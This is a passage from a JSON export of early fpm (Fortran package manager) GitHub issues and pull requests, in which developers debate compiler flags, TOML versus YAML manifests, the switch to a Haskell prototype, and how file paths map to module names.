                    "text": "My thought is that the fpm.toml doesn't specify which compilers a package works with, but which compiler is used by default when building that package on its own. When building a package as a dependency for another project I don't expect any settings to be taken from the fpm.toml file except where to find the source files, and what other dependencies are needed. Compiler, flags, any other relevant settings would be set by the parent project and be in effect for building all dependencies."
                }
            ]
        },
        {
            "number": 50,
            "user": "everythingfunctional",
            "date": "2020-03-30 15:20:37+00:00",
            "title": "Compiler flags",
            "text": "How should we organize/specify compiler flags?\nShould we only have two sets of compiler flags? devel-options and release-options, and they are used to build all dependencies and executables?\nAlso, should we come up with our own keywords for specifying the compiler options, and have a look up table to determine the correct flag for each compiler?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-30 16:29:04+00:00",
                    "text": "We will have to iterate on this, I don't know all the details either yet. Here are some guiding principles:\n\nWe should have Debug and Release builds. (I would call it Debug, not Devel.)\nPerhaps also ReleaseCheck (that would enable all optimizations, but keep all runtime checks; it could be named differently, perhaps ReleaseSafe, or something).\n\nThe Debug build should enable all runtime and compile time checks / warnings that a given compiler allows. The Release build should make the fastest build for the given architecture. For ifort I think that's the default (i.e. no options). For gfortran that's -O3 -march=native -ffast-math -funroll-loops (the later gfortran versions also have -Ofast which does a lot of these and a few more --- so we should look into it and probably use it).\nSo as a start, I would start with Debug and Release. Then as we go, we can keep refining it.\nWe can take the initial options for gfortran / Intel from here:\nhttps://www.fortran90.org/src/faq.html#what-compiler-options-should-i-use-for-development\nhttps://www.fortran90.org/src/faq.html#what-compiler-options-should-i-use-for-production-run"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-30 19:07:49+00:00",
                    "text": "Those are good suggestions for defaults. But I'm more talking about what we want to allow users to specify.\nShould we only allow users to specify a single set of compiler flags for each of debug and release modes? Or should there be some more granularity available? Different flags for executables vs libraries?\nAlso, when a user specifies compiler flags manually, should they specify the flags directly (i.e. \"-funroll-loops\") or with a more generic option that looks up the specific flag for the given compiler?"
                },
                {
                    "user": "certik",
                    "date": "2020-03-30 21:22:45+00:00",
                    "text": "Ah I see. I would definitely allow to specify any compiler flag to any file and any executable / library. That way it should be possible to build any project out there. It's just that we want to discourage users doing that obviously, but we should allow that.\nRegarding \"generic options\" like \"unroll loops\" for \"-funroll-loops`, I would not do that, because I think it will be very hard to find such options for every compiler. Initially the only generic options that I would allow are Debug / Release / ReleaseSafe. Later on, we can perhaps add more, if users request them.\nSo for example, the user can select Debug mode that would be applied to every file, except those that the user specifically sets manually."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-30 21:49:28+00:00",
                    "text": "Ok, that's definitely going to have to take some thinking about how to design on both the fpm.toml side, and the actual build process side."
                },
                {
                    "user": "certik",
                    "date": "2020-03-30 21:54:46+00:00",
                    "text": "We should not over design this. Right now we are just writing a prototype, to help us figure out the requirements, because what you are asking for are the requirements which we do not know yet, until we gain more experience using fpm with actual Fortran codebases."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-31 13:52:31+00:00",
                    "text": "You're right. I'm just going to leave out the options to specify compiler flags for now. Until we have time to design it properly."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 01:13:31+00:00",
                    "text": "What I personally understand as a debug build is enabling (some of) the following options:\n\nGenerate debugging information (should be used with a lower optimization level)\n\ngfortran -g (use with -O0 or -Og)\nifort (Linux, macOS): -g[n], -debug\nifort (Windows) /Zi, /Z7\nNAG -g\n\n\nEnable backtrace of runtime errors\n\ngfortran  -fbacktrace\nifort -traceback\nNAG -gline\n\n\nRun-time checks\n\ngfortran -fcheck=[all,array-temps,bits,bounds,do,mem,pointer,recursion]\nifort -check=[arg_temp_created,assume,bounds,contiguous,format,output_conversion,pointers,shape,stack,udio_iostat,uninit,all]\nNAG -C, -C=[alias,all,array,bits,calls,dangling,do,intovf,none,present,pointer,recursion,undefined]\n\n\n\nAdditionally, we could set flags related to handling floating-point exceptions as provided here (Intel) and here (gfortran)."
                }
            ]
        },
        {
            "number": 49,
            "user": "everythingfunctional",
            "date": "2020-03-28 18:35:57+00:00",
            "title": "TOML to Settings Architecture",
            "text": "I'm creating this as mostly a reference for how I think we should proceed with having sane defaults to allow minimal fpm.toml files. Right now I'm just reading the toml contents directly into the data structure for the settings for building the project. What I think will make more sense is to have two different data structures. One for reading the settings from the fpm.toml file, and a slightly different one for the settings for the project passed to the rest of the process. This will allow a step for interrogating the file system for some of the defaults based on the presence/absence of information in the fpm.toml file.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:23:55+00:00",
                    "text": "Closing this since it's been implemented this way."
                }
            ]
        },
        {
            "number": 48,
            "user": "everythingfunctional",
            "date": "2020-03-28 18:30:02+00:00",
            "title": "Simplify example project",
            "text": "This simplifies the example project and sets things up to begin building according to the settings read from fpm.toml",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-30 21:10:03+00:00",
                    "text": "Thanks!"
                }
            ]
        },
        {
            "number": 47,
            "user": "everythingfunctional",
            "date": "2020-03-24 21:12:17+00:00",
            "title": "Read fpm toml",
            "text": "Start reading the settings for a package from fpm.toml",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-24 21:37:14+00:00",
                    "text": "I've got it reading the first setting from an fpm.toml file. Take a look and let me know what you guys think."
                },
                {
                    "user": "certik",
                    "date": "2020-03-24 22:17:35+00:00",
                    "text": "I think this looks good.\nThis implements explicit layout, which we should support also. Based on our past discussion, by default we would encourage users to use the implicit layout, so they just need to put a file in the bin directory, and fpm will automatically build the binary out of it, just like Cargo."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 13:36:18+00:00",
                    "text": "I think this looks good.\nThis implements explicit layout, which we should support also. Based on our past discussion, by default we would encourage users to use the implicit layout, so they just need to put a file in the bin directory, and fpm will automatically build the binary out of it, just like Cargo.\n\nImplicit layout will be a bit trickier to implement I think. The default would be only one executable, with main having the default expected name (probably main.f90).\nAll doable. I think we should start with explicit, make sure that works, then come up with lots of example projects, leaving various things out to allow for defaults."
                },
                {
                    "user": "certik",
                    "date": "2020-03-25 16:14:15+00:00",
                    "text": "Here is our last iteration that we did at the Committee meeting in Vegas:\n#39 (comment)\nAnd to have more executables in the app directory, you just add more subdirectories just like Cargo does it I think."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-03-25 16:39:30+00:00",
                    "text": "I think the purpose of going for an implicit, minimal, sane default is that it can be implemented most quickly. You can then assess what's most needed to generalize next. I prefer this approach to development and we use it at Cloudrun.\nOtherwise, we have to make a lot of assumptions on what are all the options and edge cases that will be desired, and we'd spend a lot of time doing that."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 23:03:06+00:00",
                    "text": "With the toml parser I'm using, it's actually easiest to define the data structure that holds all the necessary settings, and require they be present in the toml file. Then we can figure out how to make that setting optional (have a default). Yes we should start with the simplest possible project and the simplest settings, but it actually is easier to make them required first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 23:05:47+00:00",
                    "text": "I'm going to merge this in and then take a stab at simplifying the example project and it's toml file to the bare minimum."
                }
            ]
        },
        {
            "number": 46,
            "user": "everythingfunctional",
            "date": "2020-03-13 02:25:57+00:00",
            "title": "Create first draft of an example fpm.yaml file",
            "text": "This is a first shot at what an fpm.yaml file might look like.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-13 03:38:04+00:00",
                    "text": "Thanks for trying to figure out what to put in.\nMy view is to do exactly what Rust / Cargo does. In Cargo, you can set many of these options, but by default, you do not, and you follow the layout. And you then tell cargo to build in Release or Debug modes, and Cargo chooses the default options.\nIn our case, I was thinking of following exactly the same approach. That is, fpm will support all Fortran compilers. Which means, the compiler specific options should not be set in fpm.toml, because those would be specific to a compiler, so would not work with another compiler.\nSo I would suggest to simplify your example as follows:\nname:                package-name\nversion:             0.1.0\nlicense:             BSD3\nauthor:              \"Author name here\"\nmaintainer:          \"example@example.com\"\ncopyright:           \"2020 Author name here\"\n\ndependencies: \n- stdlib\n\ntests-dependencies:\n    - vegetables 1.0  # I think in Cargo this means >= 1.0 and < 2.0\nFinally, I would follow Cargo's naming conventions.\nI am going to post a TOML example."
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 03:44:41+00:00",
                    "text": "Here is the TOML equivalent:\n[package]\nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthors = [\"Author name here <example@example.com>\"]\nedition = \"2018\"\n\n[dependencies]\nstdlib = \"0.2.3\"\n\n[dev-dependencies]\nvegetables = \"1.0\""
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 04:00:30+00:00",
                    "text": "For comparison, a literal translation of the YAML to TOML is:\nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthor = \"Author name here\"\nmaintainer = \"example@example.com\"\ncopyright = \"2020 Author name here\"\ndependencies = [\"../std-lib.tar.gz\"]\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-Werror\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[library]\nsource-dirs = \"src\"\n\n[executables.executable-name]\nmain = \"Main.f90\"\nsource-dirs = \"app\"\nlinker-options = [\"-O3\"]\ndependencies = [\"iso_varying_string\"]\n\n[tests.test-name]\nmain = \"Spec.f90\"\nsource-dirs = \"test\"\nlinker-options = [\"-Og\"]\ndependencies = [\"vegetables >= 1.0 && < 2.0\"]\n(But as I said, I think we should simplify some of the sections and follow Rust's naming scheme.)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-11 17:59:46+00:00",
                    "text": "Closing, since we're going with toml"
                }
            ]
        },
        {
            "number": 45,
            "user": "everythingfunctional",
            "date": "2020-03-12 03:08:54+00:00",
            "title": "Package File Spec",
            "text": "We need a specification, or at least a start of one, for what should go into the package file and how it should be organized.\nI'd suggest we start by answering the question \"What does fpm need to know about a package in order to be able to build it?\" in as much detail as possible and then trying to organize it logically.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:24:59+00:00",
                    "text": "I think we've settled this now?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:42+00:00",
                    "text": "Yes.\n\u2026\nOn Wed, Apr 29, 2020, at 9:25 PM, Brad Richardson wrote:\n\n\n I think we've settled this now?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#45 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBSCLSYDG6OBIOZH73RPDVRPANCNFSM4LGDENXA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 14:06:16+00:00",
                    "text": "Ok, closing."
                }
            ]
        },
        {
            "number": 44,
            "user": "everythingfunctional",
            "date": "2020-03-12 03:05:20+00:00",
            "title": "toml or yaml or something else",
            "text": "Are we sold on using toml as the file format for a package manifest/configuration file?\nI see that Rust uses toml, but many other package mangers use others. Haskell's Stack uses yaml, and I think I've seen others use that. I think I've also seen json, and maybe even xml.\nA new project Cargo.toml looks like:\n[package]\nname = \"rusttest\"\nversion = \"0.1.0\"\nauthors = [\"Brad Richardson <brichardson@structint.com>\"]\nedition = \"2018\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\n\nand a new project package.yaml (for Haskell) looks like:\nname:                haskelltest\nversion:             0.1.0.0\ngithub:              \"githubuser/haskelltest\"\nlicense:             BSD3\nauthor:              \"Author name here\"\nmaintainer:          \"example@example.com\"\ncopyright:           \"2020 Author name here\"\n\nextra-source-files:\n- README.md\n- ChangeLog.md\n\n# Metadata used when publishing your package\n# synopsis:            Short description of your package\n# category:            Web\n\n# To avoid duplicated efforts in documentation and dealing with the\n# complications of embedding Haddock markup inside cabal files, it is\n# common to point users to the README.md file.\ndescription:         Please see the README on GitHub at <https://github.com/githubuser/haskelltest#readme>\n\ndependencies:\n- base >= 4.7 && < 5\n\nlibrary:\n  source-dirs: src\n\nexecutables:\n  haskelltest-exe:\n    main:                Main.hs\n    source-dirs:         app\n    ghc-options:\n    - -threaded\n    - -rtsopts\n    - -with-rtsopts=-N\n    dependencies:\n    - haskelltest\n\ntests:\n  haskelltest-test:\n    main:                Spec.hs\n    source-dirs:         test\n    ghc-options:\n    - -threaded\n    - -rtsopts\n    - -with-rtsopts=-N\n    dependencies:\n    - haskelltest\n\nI'm not strongly opposed to toml, but it's the one I'm least familiar with. My gut tells me we should go with yaml. I would not suggest json or xml though, too much syntax/line noise.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-03-13 00:35:16+00:00",
                    "text": "Both toml and yaml look good and have sufficient capability. Yaml is personally slightly prettier to me.\nWhich has a more mature parser in Haskell? Let's go with that one.\nI recommend against json for configuration files (even though I use it a lot) because it doesn't allow comments. This would make it harder to work with them in development and testing when you want to quickly try out different values. It's also a bit more noisy (verbose) than either toml or yaml.\nxml burns my eyes."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-13 01:44:44+00:00",
                    "text": "There are parsers for both that seem pretty mature. I just think yaml is more naturally represented as a simple/common data structure, so it is easier to work with once it's parsed.\n@certik , do you have a vote?"
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 01:50:06+00:00",
                    "text": "I vote for toml, I think it's more readable, that's what Rust and Python uses and I would follow exactly the Rust model for everything unless we have a good reason not to. Fortran is close to Python and Rust in most respects than to Haskell.\n\u2026\nOn Thu, Mar 12, 2020, at 7:44 PM, Brad Richardson wrote:\n\n\n There are parsers for both that seem pretty mature. I just think yaml\n is more naturally represented as a simple/common data structure, so it\n is easier to work with once it's parsed.\n\n @certik <https://github.com/certik> , do you have a vote?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#44 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCKGWTCASXNGTPTJATRHGFZRANCNFSM4LGDB7AA>."
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 02:03:10+00:00",
                    "text": "Here are good pros and cons:\n\nhttps://www.reddit.com/r/rust/comments/7izxrg/toml_or_yaml_for_config/\n\nOne big downside of yaml is that it is very complicated. TOML is very simple for flat configuration files, and Cargo shows that flat is enough. And we should strive for flat.\n\nI agree that we should not use JSON or XML.\n\u2026\nOn Thu, Mar 12, 2020, at 7:49 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I vote for toml, I think it's more readable, that's what Rust and\n Python uses and I would follow exactly the Rust model for everything\n unless we have a good reason not to. Fortran is close to Python and\n Rust in most respects than to Haskell.\n\n On Thu, Mar 12, 2020, at 7:44 PM, Brad Richardson wrote:\n >\n >\n > There are parsers for both that seem pretty mature. I just think yaml\n > is more naturally represented as a simple/common data structure, so it\n > is easier to work with once it's parsed.\n >\n > @certik <https://github.com/certik> , do you have a vote?\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#44 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWCKGWTCASXNGTPTJATRHGFZRANCNFSM4LGDB7AA>.\n >"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-13 03:10:43+00:00",
                    "text": "@certik , that sounds reasonable. I put together an example of what an fpm.yaml file would look like (#46). Could you try converting that to toml so we can see what that would look like?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-03-13 04:08:58+00:00",
                    "text": "I am now in favor of toml as well. I like the idea of following the Rust packaging model."
                },
                {
                    "user": "certik",
                    "date": "2020-03-23 16:29:17+00:00",
                    "text": "@everythingfunctional see my comments at #46: #46 (comment) how it would look like in YAML and TOML. Let me know your thoughts."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-23 16:56:09+00:00",
                    "text": "I think the TOML looks fine. I'll start trying to put together the logic to pull in the dependencies, and compile them in the right order based on the fpm.toml file."
                },
                {
                    "user": "certik",
                    "date": "2020-03-23 18:49:37+00:00",
                    "text": "@everythingfunctional perfect. Let me know once you have something, and I'll test it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-28 18:31:28+00:00",
                    "text": "I'm going to go ahead and close this issue, since I think we've decided to stick with toml. Plus we're now moving forward in that direction."
                }
            ]
        },
        {
            "number": 43,
            "user": "everythingfunctional",
            "date": "2020-03-07 03:48:33+00:00",
            "title": "Add place to specify other libraries when building library",
            "text": "This completes all the necessary capabilities of the build system.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-09 03:32:59+00:00",
                    "text": "Next step is to start putting together fpm.toml files and code to read them."
                }
            ]
        },
        {
            "number": 42,
            "user": "everythingfunctional",
            "date": "2020-02-28 15:52:57+00:00",
            "title": "Bpr add build system",
            "text": "Can now build a single project. Assumes all files in the app directory are programs.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-28 16:15:59+00:00",
                    "text": "I tested it locally and it seems to work. Thanks!"
                }
            ]
        },
        {
            "number": 41,
            "user": "certik",
            "date": "2020-02-25 22:45:09+00:00",
            "title": "Test calling GFortran from Haskell",
            "text": "Tests the new builder on the example.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-28 17:27:18+00:00",
                    "text": "@everythingfunctional I think the build code in master failed on Windows: https://github.com/fortran-lang/fpm/pull/41/checks?check_run_id=475345857"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-04 04:16:07+00:00",
                    "text": "Got it to work on Windows. Problem was inconsistencies with file paths. At various places, Shake normalizes them to Linux form, but other things are still in Windows form."
                },
                {
                    "user": "certik",
                    "date": "2020-03-04 04:41:30+00:00",
                    "text": "@everythingfunctional thanks a lot for fixing it! I am really happy it works on Windows also."
                }
            ]
        },
        {
            "number": 40,
            "user": "everythingfunctional",
            "date": "2020-02-25 18:34:35+00:00",
            "title": "Switch to using Haskell",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-25 18:43:48+00:00",
                    "text": "The Linux and Mac works, the Windows fails due to mstksg/setup-stack#5. I am figuring a workaround."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 18:48:36+00:00",
                    "text": "@milancurcic: To describe our plan here: @everythingfunctional and I decided to join forces on FPM. Brad has already an implementation in Haskell of a subset of what we want FPM to do, and we decided to use his code to get the minimal viable version of FPM. So we'll do it in Haskell. It turns out Haskell's Stack is like Rust's Cargo, and both do what we want to achieve with FPM.\nOnce we have the minimal viable version working, we, as a community, will have to choose a language to implement this in for the long run (I still think Rust is not a bad option). But for now our goal is to get a minimal version out there, and the best is to join forces as much as we can."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 18:54:02+00:00",
                    "text": "Sounds good. I like Haskell as well. I was more interested in learning Rust though. However this is a practical decision and getting to MVP sooner is what matters.\nI only wish this was discussed in the open rather than decided under the table. Not so much about who makes the decision, but more about how and why are decisions made."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 19:04:34+00:00",
                    "text": "@milancurcic thanks for the comment. (Yes, I am personally more interested in learning Rust also.)\nI should have phrased it differently. We are working on the PR and once we are done with the PR, we would like to get a community agreement that this would be an ok path to get to the MVP. We have not made the decision under the table. Only if the community agrees, then we will merge the PR.\nThe downside is that Haskell is not as well known language. The huge upside is that now we have 2 developers (@everythingfunctional and myself) as opposed to just one developer (myself). And that, in my eyes, outweighs the slight negative of using a different language for the MVP.\nOnce MVP is out, we would need to decide what language to use for the long run. (I think I would prefer either C++ or Rust for that.)"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 19:16:03+00:00",
                    "text": "Thanks for clarifying that, sounds like a good plan."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 19:49:57+00:00",
                    "text": "Tests pass. This is currently just a bare bones Haskell project, but it runs on Linux, macOS and Windows.\n@milancurcic would you be ok with merging this PR now? It would help us to develop faster --- have a master that passes tests everywhere and we can quickly send PRs to get the features implemented. The Rust version is still there in the archive directory if we every wanted to come back to it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-02-25 19:51:27+00:00",
                    "text": "I think we can have some MVP within the week. If things go wrong or the community would rather switch back to using Rust or something else, we can always switch back to that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-02-25 19:58:00+00:00",
                    "text": "This is fine with me. As I'm not actively engaged yet, I don't have much say. But I also don't foresee issues when I do start contributing. So please go ahead with whatever you find is the best way forward and keep discussing."
                },
                {
                    "user": "certik",
                    "date": "2020-02-25 22:08:44+00:00",
                    "text": "Thanks @milancurcic! We'll keep you updated."
                }
            ]
        },
        {
            "number": 39,
            "user": "certik",
            "date": "2020-02-24 21:56:43+00:00",
            "title": "Package layout",
            "text": "We've been working with @everythingfunctional on the standardization of the layout. First iteration:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u2514\u2500\u2500 utils.f90\n\n2 directories, 4 files\n$ cat fpm.toml \nName \"a\"\n$ cat src/a.f90 \nmodule a\nuse a_utils, only: util1\nuse a_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/utils.f90 \nmodule a_utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/utils.f90 \nmodule a_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-24 23:17:07+00:00",
                    "text": "Here is a second iteration of the above layout:\n$ tree .\n.\n\u251c\u2500\u2500 app\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main.f90\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 x\n    \u2514\u2500\u2500 x.f90\n\n5 directories, 6 files"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 17:22:34+00:00",
                    "text": "I'm really confused now.\n\nThis thread doesn't say that the source file should have the same name as the module;\nIt actually implies that it can be different, e.g. utils.f90 defines module a_utils.\nfpm can't build this example because of #57.\n\nSo based on feedback so far, I assume that source file should be named the same as the module, and perhaps the spec in this thread is out of date. Then you have (ignoring app and x.f90 for simplicity):\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 a_utils.f90\n    \u2514\u2500\u2500 b\n        \u2514\u2500\u2500 a_b_utils.f90\n\n2 directories, 4 files\n\nNow the source files have the same name as the modules they define. This doesn't work either because fpm builds b_a_b_utils.o out of src/b/a_b_utils.f90:\n# gfortran (for build/debug/library/a_utils.o build/debug/library/a_utils.mod)\n# gfortran (for build/debug/library/b_a_b_utils.o build/debug/library/b_a_b_utils.mod)\nfpm-exe: Error when running Shake build system:\n  at want, called at src/Build.hs:188:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/package-name.a\n  at need, called at src/Build.hs:186:13 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/b_a_b_utils.o\n  at &%>, called at src/Build.hs:166:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/b_a_b_utils.o build/debug/library/b_a_b_utils.mod\n  at error, called at src/Development/Shake/Internal/Rules/Files.hs:245:13 in shake-0.18.5-44KSA7uQF2VObxzEvLYZx:Development.Shake.Internal.Rules.Files\n* Raised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\n  build/debug/library/b_a_b_utils.o\n  build/debug/library/b_a_b_utils.mod - MISSING\n\nOkay, so fpm does some renaming of files under the hood--b/a_b_utils.f90 compiles to b_a_b_utils.f90. But the compiler emits a_b_utils.mod and fpm expects b_a_b_utils.mod.\nA-ha! Maybe I need to call my module b_a_b_utils:\n$ head -1 src/b/a_b_utils.f90 \nmodule b_a_b_utils\n\nGreat, fpm now builds correctly.\nPerhaps this is what Brad meant in #57 when he said\n\nwe want the file name to match the module name, and the module name to include the path components of the file name.\n\nI didn't understand this because the 1st half of the sentence conflicts the 2nd half of the sentence.\nBut I think the 2nd half is key: If you have src/a/b/c/utils.f90, then the module should be called a_b_c_utils.\nGiven this, perhaps I can reverse engineer the correct spec. Let's try a third iteration:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 b\n    \u2502   \u2514\u2500\u2500 b_utils.f90\n    \u2514\u2500\u2500 utils.f90\n\nThen, the contents are:\n$ cat src/a.f90 \nmodule a\nuse utils, only: util1\nuse b_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/utils.f90 \nmodule utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/b_utils.f90 \nmodule b_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module\n\nfpm builds this correctly.\nNow, if I went through this much trouble to figure this out with help from fpm developers, imagine other people trying to build their thing with fpm. :)\nWe need a clear, clean, explicit spec."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 17:34:12+00:00",
                    "text": "@everythingfunctional and I discussed this, and the solution that we both liked in the end is precisely as I posted above (which is different to your comment), I just didn't have time to write it more explicitly. @milancurcic, please help us, we are doing what we can in our little time. If you have time, please help us write the spec.\nThe most natural way seems to have a file src/a/b/utils.f90, which means a package \"a.b\", and module \"a.b.utils\" (using Python syntax). However, in Fortran we do not have nested packages, until j3-fortran/fortran_proposals#86 is implemented. But what we can do now is to put the package name in the name of the module, so the file src/a/b/utils.f90 would start with module a_b_utils and fpm would check / enforce it. To move files around, you can simply move them, and fpm will have a mode to rename the first module line correctly.\nWhat you are proposing is to name the file as src/a/b/a_b_utils.f90 which is redundant and we feel it would be quite a pain to keep correctly named. It's much easier to simply call it src/a/b/utils.f90. However, the first module line must have the full name, to disambiguate src/a/utils.f90 from src/a/b/utils.f90.\nNow we are just working on fpm to work like this. If there are some bugs, then we need to fix them.\nIn particular, we need to write more tests, which would clarify what is meant to work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 17:38:11+00:00",
                    "text": "Ok, yeah. Here's what I think the specification about that would be.\nfpm replaces the path separators with underscores when determining the name of the .o file to be created when compiling a given source file. For modules, it also expects compiling that source file to create a .mod file with the same name as the .o file. This means that a source file a/b/utils.f90 should contain a module named a_b_utils.\nI'm sure this could use a bit more wordsmithing or clarification. It also needs to be fit into a larger specification about the expected (default) organization of an fpm compatible project, with instructions about how to override the defaults."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 17:57:01+00:00",
                    "text": "@milancurcic, please help us, we are doing what we can in our little time. If you have time, please help us write the spec.\n\nWhat do you think I'm doing? :)\n\nWhat you are proposing is to name the file as src/a/b/a_b_utils.f90 which is redundant and we feel it would be quite a pain to keep correctly named. It's much easier to simply call it src/a/b/utils.f90. However, the first module line must have the full name, to disambiguate src/a/utils.f90 from src/a/b/utils.f90.\n\nI don't propose that, it's how I originally understood Brad, but that's not what he meant and I understood it later. What led me astray is that the 2nd iteration of your tree wasn't consistent with the module names in the original post.\nBased on the feedback, here's the package structure (same as Ondrej's 2nd iteration):\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a.f90\n    \u251c\u2500\u2500 a_utils.f90\n    \u2514\u2500\u2500 b\n        \u2514\u2500\u2500 utils.f90\n\n2 directories, 4 files\n\nAnd here are the contents:\n$ cat src/a.f90 \nmodule a\nuse a_utils, only: util1\nuse a_b_utils, only: util2\n\nimplicit none\nprivate\npublic util1, util2\nend module\n$ cat src/a_utils.f90 \nmodule a_utils\nimplicit none\nprivate\npublic util1\n\ninteger :: util1\n\nend module\n$ cat src/b/utils.f90 \nmodule a_b_utils\nimplicit none\nprivate\npublic util2\n\ninteger :: util2\n\nend module\n\nDoes this look correct?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 18:17:27+00:00",
                    "text": "Almost. You are still putting the prefix into the filename in a_utils.f90. It should look like in #39 (comment). So put a_utils.f90 into a/utils.f90.\nI also had the b module nested under a, but that just depends what you are trying to show. Both can be done."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 18:27:00+00:00",
                    "text": "Oops, you're right, I did that. If we ignore src/x* and app, we get:\n$ tree .\n.\n\u251c\u2500\u2500 fpm.toml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 a\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 b\n    \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90 # module a_b_utils\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 utils.f90 # module a_utils\n    \u2514\u2500\u2500 a.f90 # module a\n\n3 directories, 4 files\n\nI put module names as # comments next to each file. I think this is correct now and I agree with it.\nIf you agree, I'll submit a PR to document this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 18:32:28+00:00",
                    "text": "Btw, current master of fpm builds this correctly."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 19:04:45+00:00",
